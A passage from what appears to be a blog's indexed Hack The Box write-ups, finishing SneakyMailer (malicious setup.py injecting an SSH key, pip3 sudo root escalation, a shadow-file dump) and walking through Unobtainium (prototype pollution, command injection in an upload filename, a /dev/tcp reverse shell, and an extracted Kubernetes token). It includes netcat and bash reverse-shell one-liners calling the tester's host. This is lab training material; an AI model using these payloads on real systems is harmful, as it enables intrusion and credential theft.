www-data. Rethinking this and I noticed we have read in /home/low/.ssh/authorized_keys, I’ll try to inject my public key there!\n\nNOTE: After reviewing writeup’s upon completion of this box I noticed it is possible to get a reverse shell directly from setup.py. To do this you add the following code (user low has uid 1000): import os if os.getuid() == 1000: os.system(‘nc -e /bin/bash 10.10.14.4 4499’)\n\nwww-data@sneakymailer:/dev/shm$ mkdir sshpy www-data@sneakymailer:/dev/shm$ cd sshpy/ www-data@sneakymailer:/dev/shm/sshpy$ touch README.md setup.cfg setup.py www-data@sneakymailer:/dev/shm/sshpy$ mkdir sshpy www-data@sneakymailer:/dev/shm/sshpy$ touch sshpy/init.py www-data@sneakymailer:/dev/shm/sshpy$ touch .pypirc\nLocally create a new SSH-key for low root@nidus:/git/htb/sneakymailer# ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): /git/htb/sneakymailer/low-id_rsa Enter passphrase (empty for no passphrase):  Enter same passphrase again: \nCreate your malicious Python code in ‘setup.py’. www-data@sneakymailer:/dev/shm/sshpy$ cat setup.py from setuptools import setup try: print(‘Injecting SSH Key to : /home/low/.ssh/authorized_keys’) with open (‘/home/low/.ssh/authorized_keys’, ‘w+’) as f: f.writelines(‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7gfXdak0OBbpzYk2K1VoGzsusV0WoVahv7wNc7H8dUaUm2gZwo8jB9ZI6bWAnbYiweLD2SJUmbPEYPwqx5LLKhf2binQv1MppDYGX21CGR7t6e/BD46DSIOnEiF/PZ3wIOvM9Ks+9WxFuZTMSbAUB03knO5b4Ux9IMOAE5Oyb4ju3NQIJrQkEYDzYDiSzgNCzio2dIZLTnjXXG+4KrNEimjKmd3I7O4Qd5MS2Le1hIIylrwv96CraJxbDWL+gGglzy5XMJrVwNefyUfSENNSSdXGBnmoOm7lHy3dWR/6b8LNN9FZaE/c9wFMhcyPgwlBNNilRjZ/9R3kCRNayxrSHe1kbUMt94dLEFrR2sOdiusZbxiBRWqnt13LApE184rWbmDer8zAUNqaOWcyeAib7nCP33jCgUHeDmHSmG6fba+2lYYBo/7nGxLAs9Rpkh0H9Iq6E3Bb4Suvyy3XcRqeSfAtBznjkjKK4NlT+B7zS6QpgXLoetHDRn8LFkSmR3M0=’)\nexcept:\n    setup(\n        name='sshpy',\n        packages=['sshpy'],\n        description='SSH Key Injection',\n        version='1.0',\n        author='PlayerThree',\n        author_email='dontemail@me.com',\n        keywords=['p3','ssh']\n        )\nCompress it, export sshpy as new home directory, and upload the package. www-data@sneakymailer:/dev/shm/sshpy$ python3 setup.py sdist www-data@sneakymailer:/dev/shm/sshpy$ export HOME=/dev/shm/sshpy www-data@sneakymailer:~$ python3 setup.py sdist upload -r sshpy\nVerifying that the key was injected. www-data@sneakymailer:~$ cat /home/low/.ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7gfXdak0OBbpzYk2K1VoGzsusV0WoVahv7wNc7H8dUaUm2gZwo8jB9ZI6bWAnbYiweLD2SJUmbPEYPwqx5LLKhf2binQv1MppDYGX21CGR7t6e/BD46DSIOnEiF/PZ3wIOvM9Ks+9WxFuZTMSbAUB03knO5b4Ux9IMOAE5Oyb4ju3NQIJrQkEYDzYDiSzgNCzio2dIZLTnjXXG+4KrNEimjKmd3I7O4Qd5MS2Le1hIIylrwv96CraJxbDWL+gGglzy5XMJrVwNefyUfSENNSSdXGBnmoOm7lHy3dWR/6b8LNN9FZaE/c9wFMhcyPgwlBNNilRjZ/9R3kCRNayxrSHe1kbUMt94dLEFrR2sOdiusZbxiBRWqnt13LApE184rWbmDer8zAUNqaOWcyeAib7nCP33jCgUHeDmHSmG6fba+2lYYBo/7nGxLAs9Rpkh0H9Iq6E3Bb4Suvyy3XcRqeSfAtBznjkjKK4NlT+B7zS6QpgXLoetHDRn8LFkSmR3M0=\nLogin with private key and grab user.txt\nroot@nidus:/git/htb/sneakymailer# ssh low@10.10.10.197 -i low-id_rsa low@sneakymailer:~$ cat user.txt 94eda5f834eda70421b0acf1d926de0c\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nNo explanation needed, GTFOBins shows you the way.\nlow@sneakymailer:~$ sudo -l sudo: unable to resolve host sneakymailer: Temporary failure in name resolution Matching Defaults entries for low on sneakymailer: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nUser low may run the following commands on sneakymailer: (root) NOPASSWD: /usr/bin/pip3\nlow@sneakymailer:~$ TF=\\((mktemp -d)\nlow@sneakymailer:~\\) echo “import os; os.execl(‘/bin/sh’, ‘sh’, ‘-c’, ‘sh &lt;\\((tty) &gt;\\)(tty) 2&gt;$(tty)’)” &gt; \\(TF/setup.py\nlow@sneakymailer:~\\) sudo pip3 install $TF\n# bash root@sneakymailer:/tmp/pip-req-build-9k8kjhct# whoami root root@sneakymailer:/tmp/pip-req-build-9k8kjhct# cat /root/root.txt 2899da30ac9b64d50fa82b79e5b1e3eb\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nPhishing, own SMTP server: https://docs.gitlab.com/ee/administration/reply_by_email_postfix_setup.html https://docs.gitlab.com/ee/administration/reply_by_email_postfix_setup.html#configure-postfix-to-receive-email-from-the-internet https://serverfault.com/questions/972270/subject-status-bounced-host-or-domain-name-not-found-name-service-error-for-n https://userlinux.net/postfix-resolving-etchosts-entries.html\nPhishing, victim SMTP server: https://www.sefnet.tech/2016/09/28/how-to-send-mail-from-command-line-using-swaks/\nPyPI Server Remote Upload: https://pypi.org/project/pypiserver/#uploading-packages-remotely\nCreate Custom PyPI Package: https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/ https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56\nEvilPy PyPI Reverse Shell: https://github.com/sn0wfa11/evil_py\nPython Reading and Writing Files: https://docs.python.org/3/tutorial/inputoutput.html#reading-and-writing-files\nData Dumps: root@sneakymailer:~# cat /etc/shadow root:\\(6\\)jJW2Iy0Knfw7c6gr$/p2MAEhr7Fy4bMIT8szzgnSkL2kp8EaPKvGQ//cfcX0bMnazYHzNwWIsGaGwgceFyftI2Xihj0rrhUbfkrzhf.:18402:0:99999:7::: low:\\(6\\)uJyxhtAXNReh6EXv$usBZZbzaXxYPjjcna4uV2qm7Zcm/tpjYxpKLZFotswl3jxwV9nFr9B8GzO9efkqNrYzuhfOcesiiiD8rZiIyb0:18402:0:99999:7::: developer:\\(6\\)QwehzS3JhUi8Ms7a$Z3bKmOwCHk6LGgcw6DtuV.Cxr90hfH945xQZrLBsaWCNxmRhFV/GWSDD9eLhpDcOYq4oD5yu6ZbF/KjNb215e.:18397:0:99999:7:::"
  },
  {
    "objectID": "posts/2021-05-25-htb-writeup-unobtainium/2021-05-25-htb-writeup-unobtainium.html",
    "href": "posts/2021-05-25-htb-writeup-unobtainium/2021-05-25-htb-writeup-unobtainium.html",
    "title": "Unobtainium - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/unobtainium]# nmap -Pn -n –open -sCV 10.10.10.235 (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA) | 256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA) |_ 256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |http-title: Unobtainium 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Tue, 25 May 2021 06:45:36 GMT | Content-Length: 212 | {“kind”:“Status”,“apiVersion”:“v1”,“metadata”:{},“status”:“Failure”,“message”:“forbidden: User”system:anonymous” cannot get path “/nice ports,/Trinity.txt.bak”“,”reason”:“Forbidden”,“details”:{},“code”:403} | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Tue, 25 May 2021 06:45:35 GMT | Content-Length: 185 | {“kind”:“Status”,“apiVersion”:“v1”,“metadata”:{},“status”:“Failure”,“message”:“forbidden: User”system:anonymous” cannot get path “/”“,”reason”:“Forbidden”,“details”:{},“code”:403} | HTTPOptions: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Tue, 25 May 2021 06:45:35 GMT | Content-Length: 189 | {“kind”:“Status”,“apiVersion”:“v1”,“metadata”:{},“status”:“Failure”,“message”:“forbidden: User”system:anonymous” cannot options path “/”“,”reason”:“Forbidden”,“details”:{},“code”:403} |_http-title: Site doesn’t have a title (application/json). | ssl-cert: Subject: commonName=minikube/organizationName=system:masters | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 | Not valid before: 2021-05-24T06:44:22 |Not valid after: 2022-05-25T06:44:22 |ssl-date: TLS randomness does not represent time | tls-alpn: | h2 | http/1.1 31337/tcp open http Node.js Express framework | http-methods: | Potentially risky methods: PUT DELETE |_http-title: Site doesn’t have a title (application/json; charset=utf-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n[root:/git/htb/unobtainium]# nmap -p- 10.10.10.235 (master✱) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 2379/tcp open etcd-client 2380/tcp open etcd-server 8443/tcp open https-alt 10250/tcp open unknown 10256/tcp open unknown 31337/tcp open Elite\n[root:/git/htb/unobtainium]# nmap -p 2379,2380,10250,10256 -sCV 10.10.10.235 (master✱) PORT STATE SERVICE VERSION 2379/tcp open ssl/etcd-client? | ssl-cert: Subject: commonName=unobtainium | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2021-01-17T07:10:30 |Not valid after: 2022-01-17T07:10:30 |ssl-date: TLS randomness does not represent time | tls-alpn: | h2 | tls-nextprotoneg: | h2 2380/tcp open ssl/etcd-server? | ssl-cert: Subject: commonName=unobtainium | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2021-01-17T07:10:30 |Not valid after: 2022-01-17T07:10:30 |ssl-date: TLS randomness does not represent time | tls-alpn: | h2 | tls-nextprotoneg: | h2 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn’t have a title (text/plain; charset=utf-8). | ssl-cert: Subject: commonName=unobtainium@1610865428 | Subject Alternative Name: DNS:unobtainium | Not valid before: 2021-01-17T05:37:08 |_Not valid after: 2022-01-17T05:37:08 |ssl-date: TLS randomness does not represent time | tls-alpn: | h2 | http/1.1 10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn’t have a title (text/plain; charset=utf-8).\nDIRB: —- Scanning URL: http://10.10.10.235/ —- ==&gt; DIRECTORY: http://10.10.10.235/assets/ ==&gt; DIRECTORY: http://10.10.10.235/downloads/ ==&gt; DIRECTORY: http://10.10.10.235/images/ + http://10.10.10.235/index.html (CODE:200|SIZE:1988) + http://10.10.10.235/server-status (CODE:403|SIZE:277)\nNIKTO: + Allowed HTTP Methods: HEAD, GET, POST, OPTIONS\nFFUF:\n-&gt; https://10.10.10.235:10250/FUZZ attach [Status: 401, Size: 12, Words: 1, Lines: 1] exec [Status: 401, Size: 12, Words: 1, Lines: 1] logs [Status: 301, Size: 41, Words: 3, Lines: 3] metrics [Status: 401, Size: 12, Words: 1, Lines: 1] pods [Status: 401, Size: 12, Words: 1, Lines: 1] run [Status: 401, Size: 12, Words: 1, Lines: 1] stats [Status: 301, Size: 42, Words: 3, Lines: 3]\n\nVisiting http://10.10.10.235 we are able to download an installation file for the chat program ‘Unobtainium’. Installing and executing the program we find a ‘TODO’-list:\n\n{“ok”:true,“content”:“1. Create administrator zone.. Update node JS API Server.. Add Login functionality.. Complete Get Messages feature.. Complete ToDo feature.. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1. Improve security”}\nThe first few words indicate that there was probably some kind of authentication before the content was printed. Open up wireshark, capture all outgoing traffic on tun0 interface and then start ‘Unobtainium’ software again. When pressing TODO in the navbar we see a POST request sent to the server - including some credentials.\nREQUEST: POST /todo HTTP/1.1 Host: unobtainium.htb:31337 Connection: keep-alive Content-Length: 73 Accept: application/json, text/javascript, /; q=0.01 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36 Content-Type: application/json Accept-Encoding: gzip, deflate Accept-Language: en-US\n{“auth”:{“name”:“felamos”,“password”:“Winter2021”},“filename”:“todo.txt”}\nREPLY: HTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 293 ETag: W/“125-tNs2+nU0UiQGmLreBy4Pj891aVA” Date: Tue, 25 May 2021 08:24:09 GMT Connection: keep-alive Keep-Alive: timeout=5\n{“ok”:true,“content”:“1. Create administrator zone.. Update node JS API Server.. Add Login functionality.. Complete Get Messages feature.. Complete ToDo feature.. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1. Improve security”}\nAfter playing around with the application for a few hours I’ve yet to find anything more of use. I change my approach and try to see if there are anything useful we can extract from the installation files.\nExtract the .deb file so we can browse them.\n[root:/git/htb/unobtainium]# dpkg –dry-run -i unobtainium_1.0.0_amd64.deb (master✱) (Reading database … 695683 files and directories currently installed.) Preparing to unpack unobtainium_1.0.0_amd64.deb … [root:/git/htb/unobtainium]# dpkg -e unobtainium_1.0.0_amd64.deb [root:/git/htb/unobtainium/DEBIAN]# cat control (master✱) Package: unobtainium Version: 1.0.0 License: ISC Vendor: felamos felamos@unobtainium.htb Architecture: amd64 Maintainer: felamos felamos@unobtainium.htb Installed-Size: 185617 Depends: libgtk-3-0, libnotify4, libnss3, libxss1, libxtst6, xdg-utils, libatspi2.0-0, libuuid1, libappindicator3-1, libsecret-1-0 Section: default Priority: extra Homepage: http://unobtainium.htb author: “0xPThree” description: client [root:…/htb/unobtainium/deb/DEBIAN]# cat postinst (master✱) .. ln -sf ‘/opt/unobtainium/unobtainium’ ‘/usr/bin/unobtainium’\nWe find user information that we already know, but also that the program is installed in /opt. Enumerate /opt/unobtainium and we find ‘/opt/unobtainium/resources/app.asar’.\nWithin we can see the credentials that we found earier, but also a set of previously unknown files:\n[root:/opt/unobtainium/resources]# cat app.asar HD={“files”:{“index.js”:{“size”:503,“offset”:“0”},“package.json”:{“size”:207,“offset”:“503”},“src”:{“files”:{“get.html”:{“size”:3821,“offset”:“710”},“index.html”:{“size”:3499,“offset”:“4531”},“post.html”:{“size”:3858,“offset”:“8030”},“todo.html”:{“size”:3799,“offset”:“11888”},“js”:{“files”:{“Chart.min.js”:{“size”:173077,“offset”:“15687”},“app.js”:{“size”:584,“offset”:“188764”},“bootstrap.bundle.min.js”:{“size”:80821,“offset”:“189348”},“check.js”:{“size”:431,“offset”:“270169”},“dashboard.js”:{“size”:953,“offset”:“270600”},“feather.min.js”:{“size”:75779,“offset”:“271553”},“get.js”:{“size”:160,“offset”:“347332”},“jquery.min.js”:{“size”:89476,“offset”:“347492”},“todo.js”:{“size”:350,“offset”:“436968”}}},“css”:{“files”:{“bootstrap.min.css”:{“size”:153111,“offset”:“437318”},“dashboard.css”:{“size”:1573,“offset”:“590429”}}}}}}}const {app, BrowserWindow} = require(‘electron’) .. $.ajax({ url: ‘http://unobtainium.htb:31337/todo’, type: ‘post’, dataType:‘json’, contentType:‘application/json’, processData: false, data: JSON.stringify({“auth”: {“name”: “felamos”, “password”: “Winter2021”}, “filename” : “todo.txt”}), success: function(data) { $(“#output”).html(JSON.stringify(data)); } }\n\nAnalyse the content of the new files, starting with the first - index.js.\n\n[root:/git/htb/unobtainium]# curl -X POST –data ‘{“auth”: {“name”: “felamos”, “password”: “Winter2021”}, “filename” : “index.js”}’ -H “Content-Type: application/json” http://unobtainium.htb:31337/todo {“ok”:true,“content”:“var root = require(\"google-cloudstorage-commands\");express = require(‘express’); = require(\"child_process\"); bodyParser = require(‘body-parser’); _ = require(‘lodash’); app = express();fs = require(‘fs’);users = [ ,, ];messages = []; lastId = 1; findUser(auth) { return users.find((u) =&gt; u.name === auth.name && u.password === auth.password); } .use(bodyParser.json()); .get(‘/’, (req, res) =&gt; { res.send(messages); }); .put(‘/’, (req, res) =&gt; { const user = findUser(req.body.auth || {}); if (!user) { res.status(403).send({ok: false, error: ‘Access denied’}); return;}const message = {icon: ’__’,};_.merge(message, req.body.message, {id: lastId++,timestamp: Date.now(),userName: user.name,});messages.push(message);res.send({ok: true});});.delete(‘/’, (req, res) =&gt; {const user = findUser(req.body.auth || {});if (!user || !user.canDelete) {res.status(403).send({ok: false, error: ‘Access denied’});return;}messages = messages.filter((m) =&gt; m.id !== req.body.messageId);res.send({ok: true});});.post(‘/upload’, (req, res) =&gt; {const user = findUser(req.body.auth || {});if (!user || !user.canUpload) {res.status(403).send({ok: false, error: ‘Access denied’});return;}filename = req.body.filename;root.upload(\"./\",filename, true);res.send({ok: true, Uploaded_File: filename});});.post(‘/todo’, (req, res) =&gt; {user = findUser(req.body.auth || {});(!user) {.status(403).send({ok: false, error: ‘Access denied’});;}= req.body.filename;testFolder = \"/usr/src/app\";fs.readdirSync(testFolder).forEach(file =&gt; {if (file.indexOf(filename) &gt; -1) {var buffer = fs.readFileSync(filename).toString();res.send({ok: true, content: buffer});}});});.listen(3000);.log(‘Listening on port 3000…’);“}\nThe code is a mess, beautify it by replacing with new lines. Now we can quickly see two interesting things; a) An admin account that has ‘canUpload: true’, but with a randomized password. b) An /upload endpoint\nMy guess is that we should give our user ‘canUpload:true’ somehow. From the software we are able to write messages (PUT), this will be our injection point.\nORIGINAL REQUEST: PUT / HTTP/1.1 Host: unobtainium.htb:31337 Connection: keep-alive Content-Length: 76 Accept: application/json, text/javascript, /; q=0.01 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36 Content-Type: application/json Accept-Encoding: gzip, deflate Accept-Language: en-US\n{“auth”:{“name”:“felamos”,“password”:“Winter2021”},“message”:{“text”:“abc”}}\nORIGINAL RESPONSE: HTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 11 ETag: W/“b-Ai2R8hgEarLmHKwesT1qcY913ys” Date: Tue, 25 May 2021 10:03:14 GMT Connection: keep-alive Keep-Alive: timeout=5\n{“ok”:true}\nGoogling around about Javascript and nodejs injections I came across Prototype Pollution.\nQUOTE: &gt; Let’s take an example, obj[a][b] = value. If an attacker can control a and value, then he can set the value of a to proto &gt; and the property b will be defined for all existing objects of the application with the value value. &gt; The simplest payload to do the same: {“proto”: {“admin”: 1}}\nMeaning in our case we could instead of ‘{“text”:“abc”}’ try to send ‘{“proto”: {“canUpload”:true}}’ to enable uploads.\nPOLLUTED REQUEST: PUT / HTTP/1.1 Host: unobtainium.htb:31337 Connection: keep-alive Content-Length: 96 Accept: application/json, text/javascript, /; q=0.01 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36 Content-Type: application/json Accept-Encoding: gzip, deflate Accept-Language: en-US\n{“auth”:{“name”:“felamos”,“password”:“Winter2021”},“message”:{“proto”: {“canUpload”: true}}}\nPOLLUTED RESPONSE: HTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 11 ETag: W/“b-Ai2R8hgEarLmHKwesT1qcY913ys” Date: Tue, 25 May 2021 12:52:53 GMT Connection: keep-alive Keep-Alive: timeout=5\n{“ok”:true}\n\nWe should now be able to POST to http://unobtainium:31337/upload with felamos:Winter2021. We already have the Request form from when getting todo.txt from /todo, so easiest is probably to reuse that.\n\nUPLOAD REQUEST: POST /upload HTTP/1.1 Host: unobtainium.htb:31337 Connection: keep-alive Content-Length: 73 Accept: application/json, text/javascript, /; q=0.01 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36 Content-Type: application/json Accept-Encoding: gzip, deflate Accept-Language: en-US\n{“auth”:{“name”:“felamos”,“password”:“Winter2021”},“filename”:“test”}\nUPLOAD RESPONSE: HTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 34 ETag: W/“22-fICdI/zK18UFTsKni+1vLp+RWvE” Date: Tue, 25 May 2021 13:53:54 GMT Connection: keep-alive Keep-Alive: timeout=5\n{“ok”:true,“Uploaded_File”:“test”}\nAfter being stuck here for many hours trying to find how the upload function works, I found a post about bash variable substitution in JSON. If the function executes we could in theory get command execution directly via the upload function.\nLets test it out with a simple poc first.\ncURL POC REQUEST: POST /upload HTTP/1.1 Host: unobtainium.htb:31337 .. {“auth”:{“name”:“felamos”,“password”:“Winter2021”},“filename”:“$(/bin/bash -c ‘curl http://10.10.14.6/test.txt’)”}\ncURL POC RESPONSE: HTTP/1.1 200 OK .. {“ok”:true,“Uploaded_File”:“$(/bin/bash -c ‘curl http://10.10.14.6/test.txt’)”}\nPYTHON HTTP.SERVER: [root:/git/htb/unobtainium]# python3 -m http.server 80 (master✱) Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) … 10.10.10.235 - - [25/May/2021 15:43:32] “GET /test.txt HTTP/1.1” 200 -\nWE GOT CODE EXECUTION!\n\nWeaponize the PoC to get a reverse shell.\n\nREVERSE REQUEST: POST /upload HTTP/1.1 Host: unobtainium.htb:31337 .. {“auth”:{“name”:“felamos”,“password”:“Winter2021”},“filename”:“$(/bin/bash -c ‘bash -i &gt;& /dev/tcp/10.10.14.6/4488 0&gt;&1’)”}\n[root:/git/htb/unobtainium]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.6] from (UNKNOWN) [10.10.10.235] 57590 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# id uid=0(root) gid=0(root) groups=0(root)\nIt seems like we are in a docker hence the root user. Grab user.txt and take a break.\nroot@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# cat /root/user.txt f7dabc890c1a2249b31d4ef6a1ab5c4d\nQUICK USER SHELL: curl -v -X PUT unobtainium.htb:31337 -H “Content-Type: application/json” -d “@user-upload.json” curl -v -X POST unobtainium.htb:31337/upload -H “Content-Type: application/json” -d “@user-reverse.json”\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nWhen enumerating the box manually I came across the file containing the upload function, and within we can clearly see it why our bash variable substitution worked (hint exec()).\n\n&lt;src/app/node_modules/google-cloudstorage-commands# cat index.js const exec = require(‘child_process’).exec const path = require(‘path’) const P = (() =&gt; { .. function upload(inputDirectory, bucket, force = false) { return new Promise((yes, no) =&gt; { let _path = path.resolve(inputDirectory) let _rn = force ? ‘-r’ : ‘-Rn’ let _cmd = exec(gsutil -m cp ${_rn} -a public-read ${_path} ${bucket}) _cmd.on(‘exit’, (code) =&gt; { yes() }) }) }\nTrying to set up persistence via ssh public key doesn’t work as we’re in a container or even a kubernetes pod to be exact, identified when we run ‘df’. We need to find a way to break out of here to the actual box in order to get root.\nroot@webapp-deployment-5d764566f4-h5zhw:/# df Filesystem 1K-blocks Used Available Use% Mounted on overlay 12318856 8388464 3788192 69% / tmpfs 65536 0 65536 0% /dev tmpfs 2015284 0 2015284 0% /sys/fs/cgroup /dev/sda1 12318856 8388464 3788192 69% /root shm 65536 0 65536 0% /dev/shm tmpfs 2015284 12 2015272 1% /run/secrets/kubernetes.io/serviceaccount tmpfs 2015284 0 2015284 0% /proc/acpi tmpfs 2015284 0 2015284 0% /proc/scsi tmpfs 2015284 0 2015284 0% /sys/firmware\nroot@webapp-deployment-5d764566f4-h5zhw:/# cd /run/secrets/kubernetes.io/serviceaccount/..data &lt;:/run/secrets/kubernetes.io/serviceaccount/..data# cat token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tZ3YycHEiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjQwODNiNTAyLWU0ZGMtNGZiMC1iNzU1LTY0ZmU3ZGVkMzcxNSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mmkqCtOB3qHPkdybHAJuaLGpQk01UGqecZZO9TfMMeO02PO2CfXoeuRyR1I0BDmyJlxuzuDZdl0k6i0AsQF4DU3Ow_Rm-YZ5cIWDVV3tfuWIA0PvJsmlJqDC4X4OmbOIULLw4i5ckWO_0I35OhlRRLumnaRRrJKFaRnWA1H-zRyAPF3fBGtUuFJecHLNTOaDMyffvBCcblT5z4jjC7V4jKKG05NUNY4UNvvtCiFfevoeTfUzJ4L2dFtkOkHV8k_nC__eJu-CqOvLQlNAWgnJvhNLry_5IVGPxos80R0IC8gOto5bFx0WsSj5av56ff_1UsnDD68IG9uHdinOZC4xvA\nAn obvious JWT Token.\nFIRST PART: 